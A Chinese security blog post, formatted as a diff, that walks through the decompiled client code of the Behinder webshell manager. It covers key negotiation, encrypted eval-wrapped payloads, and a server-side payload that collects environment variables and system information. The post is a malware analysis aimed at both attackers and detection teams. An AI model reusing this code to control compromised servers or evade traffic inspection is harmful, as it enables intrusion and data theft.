@@ -1,0 +1,1022 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="a66a8ee6c9ec28cc697b6ec358a1fabc">0x01 为什么要分析冰蝎</h1>
+<p>冰蝎是一种新型的木马连接工具，具备强大的功能，只要将冰蝎码上传到服务器并能够成功访问，那就可以执行诸多实用的功能，包括获取服务器基本信息，执行系统命令，文件管理，数据库管理，反弹meterpreter，执行自定义代码等，功能强大。而且和同类型的菜刀，蚁剑相比，加密了流量，只要在上传冰蝎码时和密匙协商建立连接的时候流量分析设备不能够检测出来，那么连接成功建立之后，waf，ids，ips就会好难再检测到出来。所以，冰蝎绝对是目前渗透测试，红蓝对抗中红方的一大利器。对于红方而言，怎么更好地利用冰蝎，怎么绕过安全流量分析设备对冰蝎的检测，对于蓝方而言，怎么更好地检测和防御冰蝎，就成为了一个重要的话题。</p>
+<h1 data-content="1" id="ffeb91e71a978b1613f7d7e2163677ff">0x02 开始</h1>
+<p>此次进行分析的是冰蝎v2.0.1版本的代码，从总体上看，冰蝎是先请求服务端，服务端判断请求之后生成一个128位的随机数，并将这个128位的随机数写入到session里面，并将这个128位的随机数返回给客户端，但是客户端并不会使用这个key作为之后的通讯的key，而是会继续重复上面过程，不断获取key，直到满足特定条件（下面的贴出代码）之后，才会确定是最终的key。客户端会保存这个key和响应报文里面的set-cookie的值。这个key就是之后客户端和服务端进行通讯的密匙。</p>
+<p>获取key和保存cookie之后，获取服务端信息，执行命令，文件操作，数据库操作等都是使用这个key和cookie进行操作，对执行的代码动态生成class字节数组，然后使用key进行aes加密，再进行base64编码，并用post方式发送数据。接收服务端返回的数据时，先使用key进行解密，解密之后的数据一般是使用了base64编码，解码之后就可以获取服务端返回的明文数据。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200227124456-e705bfb6-591b-1.png"/></p>
+<h1 data-content="1" id="850e0709ff4934633d501be8e13dc257">0x03 协商密匙 getKeyAndCookie</h1>
+<p>客户端打开和服务端的连接之后，会先调用BasicInfoUtils类，在BasicInfoUtils类的getBasicInfo方法里，会调用ShellService的构造方法新建ShellService类。而在ShellService类里面的构造方法，会调用Utils的getKeyAndCookie方法。</p>
+<pre><code>public static void getBasicInfo(final JSONObject shellEntity, final Browser baseInfoView, final Tree dirTree, final Text cmdview, final Label connectStatus, Text memoTxt, final Text imagePathTxt, Text msfTipsTxt, final Label statusLabel, final StyledText sourceCodeTxt, final Browser updateInfo, final Combo currentPathCombo, final Text sqlTxt) throws Exception {
+    int uaIndex = (new Random()).nextInt(Constants.userAgents.length - 1);
+    final String currentUserAgent = Constants.userAgents[uaIndex];
+    final MainShell mainShell = (MainShell)dirTree.getShell();
+    memoTxt.setText(shellEntity.getString("memo"));
+    formatPayloadName(shellEntity.getString("type"), msfTipsTxt, "meterpreter");
+    connectStatus.setText("Checking....");
+    statusLabel.setText("正在获取基本信息……");
+    (new Thread() {
+        public void run() {
+            try {
+                mainShell.currentShellService = new ShellService(shellEntity, currentUserAgent);
+
+                try {
+                    if (mainShell.currentShellService.currentType.equals("php")) {
+                        String content = UUID.randomUUID().toString();
+                        JSONObject obj = mainShell.currentShellService.echo(content);
+                        if (obj.getString("msg").equals(content)) {
+                            mainShell.currentShellService.encryptType = Constants.ENCRYPT_TYPE_AES;
+                        }
+                    }
+                } catch (Exception var6) {
+                    var6.printStackTrace();
+                    mainShell.currentShellService.encryptType = Constants.ENCRYPT_TYPE_XOR;
+                }</code></pre>
+<p>下面来分析Utils.getKeyAndCookie方法：</p>
+<p>放到服务端的木马里面会判断发送上来的请求是否带有pass参数，而在getKeyAndCookie里，password的值就是连接的时候的访问密码里的值，所以在连接的时候访问密码应该要填pass，否则响应报文会返回密匙获取失败，密码错误的错误信息.密匙获取成功的话，会返回一个128位的密匙，并保存在rawKey_1里面。</p>
+<pre><code>public static Map&lt;String, String&gt; getKeyAndCookie(String getUrl, String password, Map&lt;String, String&gt; requestHeaders) throws Exception {
+    disableSslVerification();
+    Map&lt;String, String&gt; result = new HashMap();
+    StringBuffer sb = new StringBuffer();
+    InputStreamReader isr = null;
+    BufferedReader br = null;
+    URL url;
+    if (getUrl.indexOf("?") &gt; 0) {
+        url = new URL(getUrl + "&amp;" + password + "=" + (new Random()).nextInt(1000));
+    } else {
+        url = new URL(getUrl + "?" + password + "=" + (new Random()).nextInt(1000));
+    }
+
+    HttpURLConnection.setFollowRedirects(false);
+    Object urlConnection;
+    String urlwithSession;
+    String errorMsg;
+    if (url.getProtocol().equals("https")) {
+        if (Main.currentProxy != null) {
+            urlConnection = (HttpsURLConnection)url.openConnection(Main.currentProxy);
+            if (Main.proxyUserName != null &amp;&amp; !Main.proxyUserName.equals("")) {
+                urlwithSession = "Proxy-Authorization";
+                errorMsg = "Basic " + Base64.encode((Main.proxyUserName + ":" + Main.proxyPassword).getBytes());
+                ((HttpURLConnection)urlConnection).setRequestProperty(urlwithSession, errorMsg);
+            }
+        } else {
+            urlConnection = (HttpsURLConnection)url.openConnection();
+        }
+    } else if (Main.currentProxy != null) {
+        urlConnection = (HttpURLConnection)url.openConnection(Main.currentProxy);
+        if (Main.proxyUserName != null &amp;&amp; !Main.proxyUserName.equals("")) {
+            urlwithSession = "Proxy-Authorization";
+            errorMsg = "Basic " + Base64.encode((Main.proxyUserName + ":" + Main.proxyPassword).getBytes());
+            ((HttpURLConnection)urlConnection).setRequestProperty(urlwithSession, errorMsg);
+        }
+    } else {
+        urlConnection = (HttpURLConnection)url.openConnection();
+    }
+
+    Iterator var23 = requestHeaders.keySet().iterator();
+
+    while(var23.hasNext()) {
+        urlwithSession = (String)var23.next();
+        ((HttpURLConnection)urlConnection).setRequestProperty(urlwithSession, (String)requestHeaders.get(urlwithSession));
+    }
+
+    if (((HttpURLConnection)urlConnection).getResponseCode() == 302 || ((HttpURLConnection)urlConnection).getResponseCode() == 301) {
+        urlwithSession = ((String)((List)((HttpURLConnection)urlConnection).getHeaderFields().get("Location")).get(0)).toString();
+        if (!urlwithSession.startsWith("http")) {
+            urlwithSession = url.getProtocol() + "://" + url.getHost() + ":" + (url.getPort() == -1 ? url.getDefaultPort() : url.getPort()) + urlwithSession;
+            urlwithSession = urlwithSession.replaceAll(password + "=[0-9]*", "");
+        }
+
+        result.put("urlWithSession", urlwithSession);
+    }
+
+    boolean error = false;
+    errorMsg = "";
+    if (((HttpURLConnection)urlConnection).getResponseCode() == 500) {
+        isr = new InputStreamReader(((HttpURLConnection)urlConnection).getErrorStream());
+        error = true;
+        errorMsg = "密钥获取失败,密码错误?";
+    } else if (((HttpURLConnection)urlConnection).getResponseCode() == 404) {
+        isr = new InputStreamReader(((HttpURLConnection)urlConnection).getErrorStream());
+        error = true;
+        errorMsg = "页面返回404错误";
+    } else {
+        isr = new InputStreamReader(((HttpURLConnection)urlConnection).getInputStream());
+    }
+
+    br = new BufferedReader(isr);
+
+    String line;
+    while((line = br.readLine()) != null) {
+        sb.append(line);
+    }
+
+    br.close();
+    if (error) {
+        throw new Exception(errorMsg);
+    } else {
+        String rawKey_1 = sb.toString();
+        String pattern = "[a-fA-F0-9]{16}";
+        Pattern r = Pattern.compile(pattern);
+        Matcher m = r.matcher(rawKey_1);
+        if (!m.find()) {
+            throw new Exception("页面存在，但是无法获取密钥!");
+        } else {
+            int start = 0;
+            int end = 0;
+            int cycleCount = 0;
+
+            while(true) {
+                Map&lt;String, String&gt; KeyAndCookie = getRawKey(getUrl, password, requestHeaders);
+                String rawKey_2 = (String)KeyAndCookie.get("key");
+                byte[] temp = CipherUtils.bytesXor(rawKey_1.getBytes(), rawKey_2.getBytes());
+
+                int i;
+                for(i = 0; i &lt; temp.length; ++i) {
+                    if (temp[i] &gt; 0) {
+                        if (start == 0 || i &lt;= start) {
+                            start = i;
+                        }
+                        break;
+                    }
+                }
+
+                for(i = temp.length - 1; i &gt;= 0; --i) {
+                    if (temp[i] &gt; 0) {
+                        if (i &gt;= end) {
+                            end = i + 1;
+                        }
+                        break;
+                    }
+                }
+
+                if (end - start == 16) {
+                    result.put("cookie", (String)KeyAndCookie.get("cookie"));
+                    result.put("beginIndex", String.valueOf(start));
+                    result.put("endIndex", String.valueOf(temp.length - end));
+                    String finalKey = new String(Arrays.copyOfRange(rawKey_2.getBytes(), start, end));
+                    result.put("key", finalKey);
+                    return result;
+                }
+
+                if (cycleCount &gt; 10) {
+                    throw new Exception("Can't figure out the key!");
+                }
+
+                ++cycleCount;
+            }
+        }
+    }
+}</code></pre>
+<p>判断得到的密匙rawKey_1之后，进入循环调用getRawKey方法，并获取rawKey_2，并且将rawKey_1和rawKey_2进行异或操作。获取rawKey_2的方法和获取rawKey_1基本是一样的。</p>
+<pre><code>public static Map&lt;String, String&gt; getRawKey(String getUrl, String password, Map&lt;String, String&gt; requestHeaders) throws Exception {
+    Map&lt;String, String&gt; result = new HashMap();
+    StringBuffer sb = new StringBuffer();
+    InputStreamReader isr = null;
+    BufferedReader br = null;
+    URL url;
+    if (getUrl.indexOf("?") &gt; 0) {
+        url = new URL(getUrl + "&amp;" + password + "=" + (new Random()).nextInt(1000));
+    } else {
+        url = new URL(getUrl + "?" + password + "=" + (new Random()).nextInt(1000));
+    }
+
+    HttpURLConnection.setFollowRedirects(false);
+    Object urlConnection;
+    String cookieValues;
+    String headerValue;
+    if (url.getProtocol().equals("https")) {
+        if (Main.currentProxy != null) {
+            urlConnection = (HttpsURLConnection)url.openConnection(Main.currentProxy);
+            if (Main.proxyUserName != null &amp;&amp; !Main.proxyUserName.equals("")) {
+                cookieValues = "Proxy-Authorization";
+                headerValue = "Basic " + Base64.encode((Main.proxyUserName + ":" + Main.proxyPassword).getBytes());
+                ((HttpURLConnection)urlConnection).setRequestProperty(cookieValues, headerValue);
+            }
+        } else {
+            urlConnection = (HttpsURLConnection)url.openConnection();
+        }
+    } else if (Main.currentProxy != null) {
+        urlConnection = (HttpURLConnection)url.openConnection(Main.currentProxy);
+        if (Main.proxyUserName != null &amp;&amp; !Main.proxyUserName.equals("")) {
+            cookieValues = "Proxy-Authorization";
+            headerValue = "Basic " + Base64.encode((Main.proxyUserName + ":" + Main.proxyPassword).getBytes());
+            ((HttpURLConnection)urlConnection).setRequestProperty(cookieValues, headerValue);
+        }
+    } else {
+        urlConnection = (HttpURLConnection)url.openConnection();
+    }
+
+    Iterator var15 = requestHeaders.keySet().iterator();
+
+    while(var15.hasNext()) {
+        cookieValues = (String)var15.next();
+        ((HttpURLConnection)urlConnection).setRequestProperty(cookieValues, (String)requestHeaders.get(cookieValues));
+    }
+
+    cookieValues = "";
+    Map&lt;String, List&lt;String&gt;&gt; headers = ((HttpURLConnection)urlConnection).getHeaderFields();
+    Iterator var12 = headers.keySet().iterator();
+
+    String line;
+    while(var12.hasNext()) {
+        String headerName = (String)var12.next();
+        if (headerName != null &amp;&amp; headerName.equalsIgnoreCase("Set-Cookie")) {
+            for(Iterator var14 = ((List)headers.get(headerName)).iterator(); var14.hasNext(); cookieValues = cookieValues + ";" + line) {
+                line = (String)var14.next();
+            }
+
+            cookieValues = cookieValues.startsWith(";") ? cookieValues.replaceFirst(";", "") : cookieValues;
+            break;
+        }
+    }
+
+    result.put("cookie", cookieValues);
+    boolean error = false;
+    String errorMsg = "";
+    if (((HttpURLConnection)urlConnection).getResponseCode() == 500) {
+        isr = new InputStreamReader(((HttpURLConnection)urlConnection).getErrorStream());
+        error = true;
+        errorMsg = "密钥获取失败,密码错误?";
+    } else if (((HttpURLConnection)urlConnection).getResponseCode() == 404) {
+        isr = new InputStreamReader(((HttpURLConnection)urlConnection).getErrorStream());
+        error = true;
+        errorMsg = "页面返回404错误";
+    } else {
+        isr = new InputStreamReader(((HttpURLConnection)urlConnection).getInputStream());
+    }
+
+    br = new BufferedReader(isr);
+
+    while((line = br.readLine()) != null) {
+        sb.append(line);
+    }
+
+    br.close();
+    if (error) {
+        throw new Exception(errorMsg);
+    } else {
+        result.put("key", sb.toString());
+        return result;
+    }
+}</code></pre>
+<p>上面虽然获取了rawKey_1以及是rawKey_1和rawKey_2异或之后的temp字节数组，但是实际上最终的finalKey其实都是使用rawKey_2，temp数组只是用来控制循环的结束条件。每一次循环，都会重新获取rawKey_2，重新和rawKey_1异或生成temp字节数组，其中temp字节数组会在两个循环里面控制start和end变量的值，当end-start==16时，结束循环，并返回最新获取的rawKey_2作为finalKey。</p>
+<pre><code>String rawKey_1 = sb.toString();
+String pattern = "[a-fA-F0-9]{16}";
+Pattern r = Pattern.compile(pattern);
+Matcher m = r.matcher(rawKey_1);
+if (!m.find()) {
+    throw new Exception("页面存在，但是无法获取密钥!");
+} else {
+    int start = 0;
+    int end = 0;
+    int cycleCount = 0;
+
+    while(true) {
+        Map&lt;String, String&gt; KeyAndCookie = getRawKey(getUrl, password, requestHeaders);
+        String rawKey_2 = (String)KeyAndCookie.get("key");
+        byte[] temp = CipherUtils.bytesXor(rawKey_1.getBytes(), rawKey_2.getBytes());
+
+        int i;
+        for(i = 0; i &lt; temp.length; ++i) {
+            if (temp[i] &gt; 0) {
+                if (start == 0 || i &lt;= start) {
+                    start = i;
+                }
+                break;
+            }
+        }
+
+        for(i = temp.length - 1; i &gt;= 0; --i) {
+            if (temp[i] &gt; 0) {
+                if (i &gt;= end) {
+                    end = i + 1;
+                }
+                break;
+            }
+        }
+
+        if (end - start == 16) {
+            result.put("cookie", (String)KeyAndCookie.get("cookie"));
+            result.put("beginIndex", String.valueOf(start));
+            result.put("endIndex", String.valueOf(temp.length - end));
+            String finalKey = new String(Arrays.copyOfRange(rawKey_2.getBytes(), start, end));
+            result.put("key", finalKey);
+            return result;
+        }
+
+        if (cycleCount &gt; 10) {
+            throw new Exception("Can't figure out the key!");
+        }
+
+        ++cycleCount;
+    }</code></pre>
+<p>返回的finalKey就是循环最后一轮获取的rawKey_2，所以rawKey_1和temp字节数组对于最终的finalKey来说其实并没有用到。我目前的一个猜测是动态控制请求服务端获取key的次数，不固定向服务端请求密匙的次数，以此来绕过waf或nids的一些检测特征，但是其实waf或者nids将同一个会话服务端向客户端返回的可疑的128位随机数保存，然后取最后一次保存的128位随机数作为这个会话的通讯密匙，然后解密这个会话的通讯内容，如果可以成功解密和进行base64解码，那么就可以判断明文内容是不是触发检测规则。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200227142948-8d2eefb2-592a-1.png"/></p>
+<p>返回到ShellService之后会获取之后会获取返回结果里面的cookie和key，在之后的请求里面都会使用这个cookie和key。</p>
+<pre><code>Map&lt;String, String&gt; keyAndCookie = Utils.getKeyAndCookie(this.currentUrl, this.currentPassword, this.currentHeaders);
+String cookie = (String)keyAndCookie.get("cookie");
+if ((cookie == null || cookie.equals("")) &amp;&amp; !this.currentHeaders.containsKey("cookie")) {
+    String urlWithSession = (String)keyAndCookie.get("urlWithSession");
+    if (urlWithSession != null) {
+        this.currentUrl = urlWithSession;
+    }
+
+    this.currentKey = (String)Utils.getKeyAndCookie(this.currentUrl, this.currentPassword, this.currentHeaders).get("key");
+} else {
+    this.mergeCookie(this.currentHeaders, cookie);
+    this.currentKey = (String)keyAndCookie.get("key");
+    if (this.currentType.equals("php") || this.currentType.equals("aspx")) {
+        this.beginIndex = Integer.parseInt((String)keyAndCookie.get("beginIndex"));
+        this.endIndex = Integer.parseInt((String)keyAndCookie.get("endIndex"));
+    }
+}</code></pre>
+<p>至此，getKeyAndCookie部分执行完成。下面将以getBasicInfo和runCMD为例分析如何使用这个cookie和key。</p>
+<h1 data-content="1" id="1ff5eb8fc91c3835af8ee66ab60fff65">0x04 获取服务器基本信息 getBasicInfo</h1>
+<p>在获取了cookie和key之后，BasicInfoUtil的getBasicInfo就会调用ShellService的getBasicInfo方法来获取放了木马的服务器的基本信息。</p>
+<p><code>JSONObject basicInfoObj = new JSONObject(mainShell.currentShellService.getBasicInfo());</code></p>
+<p>在ShellService的getBasicInfo里，会调用Utils.getData方法和Utils.requestAndParse方法，其中，getData方法是使用key加密要执行的代码的class字节数组，并进行base64编码；而requestAndParse则是使用带有获取的cookie的请求头来postgetData得到的加密和编码过后的字节数组，并获取返回信息。</p>
+<pre><code>public String getBasicInfo() throws Exception {
+    String result = "";
+    Map&lt;String, String&gt; params = new LinkedHashMap();
+    byte[] data = Utils.getData(this.currentKey, this.encryptType, "BasicInfo", params, this.currentType);
+    Map&lt;String, Object&gt; resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+    byte[] resData = (byte[])resultObj.get("data");
+
+    try {
+        result = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+        return result;
+    } catch (Exception var7) {
+        var7.printStackTrace();
+        throw new Exception("请求失败:" + new String(resData, "UTF-8"));
+    }
+}</code></pre>
+<p>进入Utils.getData方法，会调用net.rebeyond.behinder.core.Params里面的getParamedClass方法，传入BasicInfo参数，使用ASM框架来动态修改class文件中的属性值，详细可参考<a href="https://xz.aliyun.com/t/2744" target="_blank">https://xz.aliyun.com/t/2744</a> 这篇文章</p>
+<pre><code>public static byte[] getData(String key, int encryptType, String className, Map&lt;String, String&gt; params, String type) throws Exception {
+    return getData(key, encryptType, className, params, type, (byte[])null);
+}
+
+public static byte[] getData(String key, int encryptType, String className, Map&lt;String, String&gt; params, String type, byte[] extraData) throws Exception {
+    byte[] bincls;
+    byte[] encrypedBincls;
+    if (type.equals("jsp")) {
+        className = "net.rebeyond.behinder.payload.java." + className;
+        bincls = Params.getParamedClass(className, params);
+        if (extraData != null) {
+            bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
+        }
+
+        encrypedBincls = Crypt.Encrypt(bincls, key);
+        String basedEncryBincls = Base64.encode(encrypedBincls);
+        return basedEncryBincls.getBytes();
+    } else if (type.equals("php")) {
+        bincls = Params.getParamedPhp(className, params);
+        bincls = Base64.encode(bincls).getBytes();
+        bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
+        if (extraData != null) {
+            bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
+        }
+
+        encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
+        return Base64.encode(encrypedBincls).getBytes();
+    } else if (type.equals("aspx")) {
+        bincls = Params.getParamedAssembly(className, params);
+        if (extraData != null) {
+            bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
+        }
+
+        encrypedBincls = Crypt.EncryptForCSharp(bincls, key);
+        return encrypedBincls;
+    } else if (type.equals("asp")) {
+        bincls = Params.getParamedAsp(className, params);
+        if (extraData != null) {
+            bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
+        }
+
+        encrypedBincls = Crypt.EncryptForAsp(bincls, key);
+        return encrypedBincls;
+    } else {
+        return null;
+    }
+}</code></pre>
+<p>我们来关注传入去Param的参数BasicInfo这个类的代码，这个类就是要在放了木马的服务器上执行的payload，这里必须提醒一句，在服务端上的木马在使用ClassLoader来实例化接收回来的class字节数组之后，就会调用equals方法，同时传入Pagecontext对象来使payload获取到session，request，response对象，然后才是获取服务器上面的环境变量，jre参数，当前路径等信息</p>
+<pre><code>public boolean equals(Object obj) {
+        PageContext page = (PageContext)obj;
+        page.getResponse().setCharacterEncoding("UTF-8");
+        String result = "";
+
+        try {
+            StringBuilder basicInfo = new StringBuilder("&lt;br/&gt;&lt;font size=2 color=red&gt;环境变量:&lt;/font&gt;&lt;br/&gt;");
+            Map&lt;String, String&gt; env = System.getenv();
+            Iterator var7 = env.keySet().iterator();
+
+            while(var7.hasNext()) {
+                String name = (String)var7.next();
+                basicInfo.append(name + "=" + (String)env.get(name) + "&lt;br/&gt;");
+            }
+
+            basicInfo.append("&lt;br/&gt;&lt;font size=2 color=red&gt;JRE系统属性:&lt;/font&gt;&lt;br/&gt;");
+            Properties props = System.getProperties();
+            Set&lt;Entry&lt;Object, Object&gt;&gt; entrySet = props.entrySet();
+            Iterator var9 = entrySet.iterator();
+
+            while(var9.hasNext()) {
+                Entry&lt;Object, Object&gt; entry = (Entry)var9.next();
+                basicInfo.append(entry.getKey() + " = " + entry.getValue() + "&lt;br/&gt;");
+            }
+
+            String currentPath = (new File("")).getAbsolutePath();
+            String driveList = "";
+            File[] roots = File.listRoots();
+            File[] var14 = roots;
+            int var13 = roots.length;
+
+            for(int var12 = 0; var12 &lt; var13; ++var12) {
+                File f = var14[var12];
+                driveList = driveList + f.getPath() + ";";
+            }
+
+            String osInfo = System.getProperty("os.name") + System.getProperty("os.version") + System.getProperty("os.arch");
+            Map&lt;String, String&gt; entity = new HashMap();
+            entity.put("basicInfo", basicInfo.toString());
+            entity.put("currentPath", currentPath);
+            entity.put("driveList", driveList);
+            entity.put("osInfo", osInfo);
+            result = this.buildJson(entity, true);
+            String key = page.getSession().getAttribute("u").toString();
+            ServletOutputStream so = page.getResponse().getOutputStream();
+            so.write(Encrypt(result.getBytes(), key));
+            so.flush();
+            so.close();
+            page.getOut().clear();
+        } catch (Exception var15) {
+            var15.printStackTrace();
+        }
+
+        return true;
+    }</code></pre>
+<p>BasicInfo类里对拿到的信息进行base64编码并转换成json格式</p>
+<pre><code>private String buildJson(Map&lt;String, String&gt; entity, boolean encode) throws Exception {
+    StringBuilder sb = new StringBuilder();
+    String version = System.getProperty("java.version");
+    sb.append("{");
+    Iterator var6 = entity.keySet().iterator();
+
+    while(var6.hasNext()) {
+        String key = (String)var6.next();
+        sb.append("\"" + key + "\":\"");
+        String value = ((String)entity.get(key)).toString();
+        if (encode) {
+            Class Base64;
+            Object Encoder;
+            if (version.compareTo("1.9") &gt;= 0) {
+                this.getClass();
+                Base64 = Class.forName("java.util.Base64");
+                Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
+                value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
+            } else {
+                this.getClass();
+                Base64 = Class.forName("sun.misc.BASE64Encoder");
+                Encoder = Base64.newInstance();
+                value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
+                value = value.replace("\n", "").replace("\r", "");
+            }
+        }
+
+        sb.append(value);
+        sb.append("\",");
+    }
+
+    sb.setLength(sb.length() - 1);
+    sb.append("}");
+    return sb.toString();
+}</code></pre>
+<p>然后对json数据进行加密,并把数据返回给客户端</p>
+<pre><code>public static byte[] Encrypt(byte[] bs, String key) throws Exception {
+    byte[] raw = key.getBytes("utf-8");
+    SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
+    Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
+    cipher.init(1, skeySpec);
+    byte[] encrypted = cipher.doFinal(bs);
+    return encrypted;
+}</code></pre>
+<p>这里再提醒一次，上面BasicInfo是放在服务器上执行的payload，是在放了木马的服务器上执行的，不是运行客户端的电脑执行的，获取到服务器的信息就加密和编码，再返回给客户端。客户端的Utils.getData将这个basicInfo的payload借助Params类来动态生成字节数组，然后再对字节数组加密和base64编码，然后返回。</p>
+<pre><code>public static byte[] getData(String key, int encryptType, String className, Map&lt;String, String&gt; params, String type, byte[] extraData) throws Exception {
+    byte[] bincls;
+    byte[] encrypedBincls;
+    if (type.equals("jsp")) {
+        className = "net.rebeyond.behinder.payload.java." + className;
+        bincls = Params.getParamedClass(className, params);
+        if (extraData != null) {
+            bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
+        }
+
+        encrypedBincls = Crypt.Encrypt(bincls, key);
+        String basedEncryBincls = Base64.encode(encrypedBincls);
+        return basedEncryBincls.getBytes();
+    } else if (type.equals("php")) {
+        bincls = Params.getParamedPhp(className, params);
+        bincls = Base64.encode(bincls).getBytes();
+        bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
+        if (extraData != null) {
+            bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
+        }
+
+        encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
+        return Base64.encode(encrypedBincls).getBytes();
+    } else if (type.equals("aspx")) {
+        bincls = Params.getParamedAssembly(className, params);
+        if (extraData != null) {
+            bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
+        }
+
+        encrypedBincls = Crypt.EncryptForCSharp(bincls, key);
+        return encrypedBincls;
+    } else if (type.equals("asp")) {
+        bincls = Params.getParamedAsp(className, params);
+        if (extraData != null) {
+            bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
+        }
+
+        encrypedBincls = Crypt.EncryptForAsp(bincls, key);
+        return encrypedBincls;
+    } else {
+        return null;
+    }
+}</code></pre>
+<p>接下来调用Utils.requestAndParse来发送数据，这个过程无什么特别，就是post发送带有cookie的请求头，加密编码的字节数组为请求内容的请求报文，并获取服务端的返回结果</p>
+<pre><code>public static Map&lt;String, Object&gt; requestAndParse(String urlPath, Map&lt;String, String&gt; header, byte[] data, int beginIndex, int endIndex) throws Exception {
+    Map&lt;String, Object&gt; resultObj = sendPostRequestBinary(urlPath, header, data);
+    byte[] resData = (byte[])resultObj.get("data");
+    if ((beginIndex != 0 || endIndex != 0) &amp;&amp; resData.length - endIndex &gt;= beginIndex) {
+        resData = Arrays.copyOfRange(resData, beginIndex, resData.length - endIndex);
+    }
+
+    resultObj.put("data", resData);
+    return resultObj;
+}
+
+public static Map&lt;String, Object&gt; sendPostRequestBinary(String urlPath, Map&lt;String, String&gt; header, byte[] data) throws Exception {
+    Map&lt;String, Object&gt; result = new HashMap();
+    ByteArrayOutputStream bos = new ByteArrayOutputStream();
+    URL url = new URL(urlPath);
+    HttpURLConnection conn;
+    String key;
+    if (Main.currentProxy != null) {
+        conn = (HttpURLConnection)url.openConnection(Main.currentProxy);
+        if (Main.proxyUserName != null &amp;&amp; !Main.proxyUserName.equals("")) {
+            key = "Proxy-Authorization";
+            String headerValue = "Basic " + Base64.encode((Main.proxyUserName + ":" + Main.proxyPassword).getBytes());
+            conn.setRequestProperty(key, headerValue);
+        }
+    } else {
+        conn = (HttpURLConnection)url.openConnection();
+    }
+
+    conn.setRequestProperty("Content-Type", "application/octet-stream");
+    conn.setRequestMethod("POST");
+    if (header != null) {
+        Iterator var13 = header.keySet().iterator();
+
+        while(var13.hasNext()) {
+            key = (String)var13.next();
+            conn.setRequestProperty(key, (String)header.get(key));
+        }
+    }
+
+    conn.setDoOutput(true);
+    conn.setDoInput(true);
+    conn.setUseCaches(false);
+    OutputStream outwritestream = conn.getOutputStream();
+    outwritestream.write(data);
+    outwritestream.flush();
+    outwritestream.close();
+    byte[] buffer;
+    boolean var10;
+    DataInputStream din;
+    int length;
+    if (conn.getResponseCode() == 200) {
+        din = new DataInputStream(conn.getInputStream());
+        buffer = new byte[1024];
+        var10 = false;
+
+        while((length = din.read(buffer)) != -1) {
+            bos.write(buffer, 0, length);
+        }
+
+        byte[] resData = bos.toByteArray();
+        System.out.println("res before decrypt:" + new String(resData));
+        result.put("data", resData);
+        Map&lt;String, String&gt; responseHeader = new HashMap();
+        Iterator var11 = conn.getHeaderFields().keySet().iterator();
+
+        while(var11.hasNext()) {
+            String key = (String)var11.next();
+            responseHeader.put(key, conn.getHeaderField(key));
+        }
+
+        responseHeader.put("status", String.valueOf(conn.getResponseCode()));
+        result.put("header", responseHeader);
+        return result;
+    } else {
+        din = new DataInputStream(conn.getErrorStream());
+        buffer = new byte[1024];
+        var10 = false;
+
+        while((length = din.read(buffer)) != -1) {
+            bos.write(buffer, 0, length);
+        }
+
+        throw new Exception(new String(bos.toByteArray(), "GBK"));
+    }
+}</code></pre>
+<p>然后就是在ShellService里解密响应报文的数据，</p>
+<pre><code>String result = "";
+Map&lt;String, String&gt; params = new LinkedHashMap();
+byte[] data = Utils.getData(this.currentKey, this.encryptType, "BasicInfo", params, this.currentType);
+Map&lt;String, Object&gt; resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+byte[] resData = (byte[])resultObj.get("data");
+
+try {
+    result = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+    return result;
+} catch (Exception var7) {
+    var7.printStackTrace();
+    throw new Exception("请求失败:" + new String(resData, "UTF-8"));
+}</code></pre>
+<p>在BasicInfoUtil里解码获取到的服务器信息并显示</p>
+<pre><code>JSONObject basicInfoObj = new JSONObject(mainShell.currentShellService.getBasicInfo());
+final String basicInfoStr = new String(Base64.decode(basicInfoObj.getString("basicInfo")), "UTF-8");
+final String driveList = (new String(Base64.decode(basicInfoObj.getString("driveList")), "UTF-8")).replace(":\\", ":/");
+final String currentPath = new String(Base64.decode(basicInfoObj.getString("currentPath")), "UTF-8");
+final String osInfo = (new String(Base64.decode(basicInfoObj.getString("osInfo")), "UTF-8")).toLowerCase();
+mainShell.basicInfoMap.put("basicInfo", basicInfoStr);
+mainShell.basicInfoMap.put("driveList", driveList);
+mainShell.basicInfoMap.put("currentPath", currentPath);
+mainShell.basicInfoMap.put("osInfo", osInfo.replace("winnt", "windows"));
+Display.getDefault().syncExec(new Runnable() {
+    public void run() {
+        if (!statusLabel.isDisposed()) {
+            baseInfoView.setText(basicInfoStr);
+            statusLabel.setText("基本信息获取完成，你可以使用CTRL+F进行搜索");</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200227145241-bfd15a38-592d-1.png"/></p>
+<p>至此，服务器基本信息获取完成，getBasicInfo执行完成。</p>
+<h1 data-content="1" id="cd8eec82cda9f96fa731ce8ff37422c3">0x05 执行命令 runCmd</h1>
